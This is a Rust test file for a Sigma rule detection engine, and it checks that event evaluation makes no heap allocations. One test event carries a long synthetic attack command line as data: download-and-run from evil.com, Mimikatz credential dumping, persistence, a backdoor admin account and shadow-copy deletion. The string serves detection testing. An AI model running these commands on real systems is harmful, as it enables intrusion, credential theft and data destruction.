use null_sigma::SigmaEngine;
use std::alloc::{GlobalAlloc, Layout, System};
use std::cell::Cell;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

struct CountingAlloc;

thread_local! {
    static TRACK_THIS_THREAD: Cell<bool> = const { Cell::new(false) };
    static THREAD_ALLOC_COUNT: Cell<usize> = const { Cell::new(0) };
    static THREAD_ALLOC_BYTES: Cell<usize> = const { Cell::new(0) };
}

unsafe impl GlobalAlloc for CountingAlloc {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        TRACK_THIS_THREAD.with(|t| {
            if t.get() {
                t.set(false);
                THREAD_ALLOC_COUNT.with(|c| c.set(c.get() + 1));
                THREAD_ALLOC_BYTES.with(|b| b.set(b.get() + layout.size()));
                t.set(true);
            }
        });
        System.alloc(layout)
    }

    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        System.dealloc(ptr, layout);
    }
}

#[global_allocator]
static A: CountingAlloc = CountingAlloc;

fn find_yamls(dir: &Path, paths: &mut Vec<PathBuf>) {
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                find_yamls(&path, paths);
            } else if path
                .extension()
                .is_some_and(|ext| ext == "yml" || ext == "yaml")
            {
                paths.push(path);
            }
        }
    }
}

#[test]
fn test_zero_allocations_on_evaluation_hot_path() {
    let mut engine = SigmaEngine::new();

    let rule1 = r#"
title: Suspicious PowerShell Encoded Command
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: '-EncodedCommand'
        Image|endswith: '\powershell.exe'
    condition: selection
"#;
    let rule2 = r#"
title: Suspicious CMD Execution
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\cmd.exe'
        CommandLine|contains: '/c whoami'
    condition: selection
"#;
    let rule3 = r#"
title: Specific Chrome Renderer Match Rule
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\chrome.exe'
        CommandLine|contains: '--type=renderer'
    condition: selection
"#;

    engine.load_rule(rule1).unwrap();
    engine.load_rule(rule2).unwrap();
    engine.load_rule(rule3).unwrap();

    let mut single_match_event = HashMap::new();
    single_match_event.insert(
        "Image".to_string(),
        r"C:\Program Files\Google\Chrome\chrome.exe".to_string(),
    );
    single_match_event.insert(
        "CommandLine".to_string(),
        r"chrome.exe --type=renderer --no-sandbox".to_string(),
    );
    single_match_event.insert("category".to_string(), "process_creation".to_string());
    single_match_event.insert("product".to_string(), "windows".to_string());

    let mut attack_event = HashMap::new();
    attack_event.insert(
        "Image".to_string(),
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string(),
    );
    attack_event.insert(
        "CommandLine".to_string(),
        r"powershell.exe -EncodedCommand JABhACAAPQAgADEA".to_string(),
    );
    attack_event.insert("category".to_string(), "process_creation".to_string());
    attack_event.insert("product".to_string(), "windows".to_string());

    let mut non_matching_event = HashMap::new();
    non_matching_event.insert(
        "Image".to_string(),
        r"C:\Windows\System32\notepad.exe".to_string(),
    );
    non_matching_event.insert(
        "CommandLine".to_string(),
        r"notepad.exe doc.txt".to_string(),
    );
    non_matching_event.insert("category".to_string(), "process_creation".to_string());
    non_matching_event.insert("product".to_string(), "windows".to_string());

    // 1. Warmup: allows thread-local pools (scratch buffers, candidate masks) to allocate
    for _ in 0..1_000 {
        let _ = engine.evaluate_event_count(&single_match_event);
        let _ = engine.evaluate_event_count(&attack_event);
        let _ = engine.evaluate_event(&non_matching_event);
    }

    // 2. Active Tracking: zero allocations during count evaluation
    THREAD_ALLOC_COUNT.with(|c| c.set(0));
    THREAD_ALLOC_BYTES.with(|b| b.set(0));
    TRACK_THIS_THREAD.with(|t| t.set(true));

    for _ in 0..10_000 {
        let hits = engine.evaluate_event_count(&single_match_event);
        assert_eq!(hits, 1);
        let attack_hits = engine.evaluate_event_count(&attack_event);
        assert_eq!(attack_hits, 1);
    }

    // Also test evaluate_event on non-matching events (empty Vec returns without allocation)
    for _ in 0..10_000 {
        let matches = engine.evaluate_event(&non_matching_event);
        assert!(matches.is_empty());
    }

    TRACK_THIS_THREAD.with(|t| t.set(false));

    let count = THREAD_ALLOC_COUNT.with(|c| c.get());
    let bytes = THREAD_ALLOC_BYTES.with(|b| b.get());

    println!(
        "Allocations during 30,000 evaluations: count = {}, bytes = {}",
        count, bytes
    );
    assert_eq!(
        count, 0,
        "Expected 0 allocations on evaluation hot path, got {}",
        count
    );
    assert_eq!(
        bytes, 0,
        "Expected 0 bytes allocated on evaluation hot path, got {}",
        bytes
    );
}

#[test]
fn test_zero_allocations_evaluate_event_into_corpus() {
    let mut engine = SigmaEngine::new();
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let rule_dir = manifest_dir.join("corpus/sigmahq/rules/windows/process_creation");

    let mut paths = Vec::new();
    find_yamls(&rule_dir, &mut paths);
    assert!(
        !paths.is_empty(),
        "SigmaHQ corpus directory missing at {}",
        rule_dir.display()
    );

    let mut loaded = 0;
    for path in &paths {
        if let Ok(content) = std::fs::read_to_string(path) {
            if engine.load_rule(&content).is_ok() {
                loaded += 1;
            }
        }
    }
    println!("[allocation_test] Loaded {} rules into SigmaEngine", loaded);
    assert!(
        loaded >= 1100,
        "Expected >= 1100 rules loaded, got {}",
        loaded
    );

    let attack_cmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden \
        -EncodedCommand SQBFAFgA -c \"IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/malware.ps1')); \
        Invoke-Mimikatz -DumpCreds; certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\DismHost.exe; \
        schtasks.exe /create /tn EvilUpdate /tr C:\\Windows\\Temp\\DismHost.exe /sc onlogon /ru SYSTEM; \
        reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d calc.exe /f; \
        net.exe user /add hacker Password123!; net.exe localgroup administrators hacker /add; \
        vssadmin.exe delete shadows /all /quiet; bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures; \
        wmic.exe process call create cmd.exe; rundll32.exe C:\\Windows\\Temp\\test.dll,DllRegisterServer; \
        mshta.exe javascript:a=GetObject('script:http://evil.com/a.hta'); curl.exe -s http://evil.com/sh | sh\"";

    let mut attack_event = HashMap::new();
    attack_event.insert("category".into(), "process_creation".into());
    attack_event.insert("product".into(), "windows".into());
    attack_event.insert("EventID".into(), "1".into());
    attack_event.insert(
        "Image".into(),
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
    );
    attack_event.insert("CommandLine".into(), attack_cmd.into());
    attack_event.insert("ParentImage".into(), r"C:\Windows\System32\cmd.exe".into());

    let mut buf = Vec::with_capacity(64);

    // Warmup: populate thread-local scratch vectors and let buf grow if needed
    for _ in 0..500 {
        buf.clear();
        engine.evaluate_event_into(&attack_event, &mut buf);
    }
    let expected_matches = buf.len();
    assert!(
        expected_matches > 0,
        "Expected attack event to match rules, got 0"
    );
    println!(
        "[allocation_test] Attack event matched {} rules in corpus",
        expected_matches
    );

    // Reset allocation counters and start active tracking
    THREAD_ALLOC_COUNT.with(|c| c.set(0));
    THREAD_ALLOC_BYTES.with(|b| b.set(0));
    TRACK_THIS_THREAD.with(|t| t.set(true));

    for _ in 0..10_000 {
        buf.clear();
        engine.evaluate_event_into(&attack_event, &mut buf);
        assert_eq!(buf.len(), expected_matches);
    }

    TRACK_THIS_THREAD.with(|t| t.set(false));

    let count = THREAD_ALLOC_COUNT.with(|c| c.get());
    let bytes = THREAD_ALLOC_BYTES.with(|b| b.get());

    println!(
        "Allocations during 10,000 evaluate_event_into calls across {} rules: count = {}, bytes = {}",
        loaded, count, bytes
    );
    assert_eq!(
        count, 0,
        "evaluate_event_into produced {} heap allocations, expected 0",
        count
    );
    assert_eq!(
        bytes, 0,
        "evaluate_event_into allocated {} bytes on heap, expected 0",
        bytes
    );
}
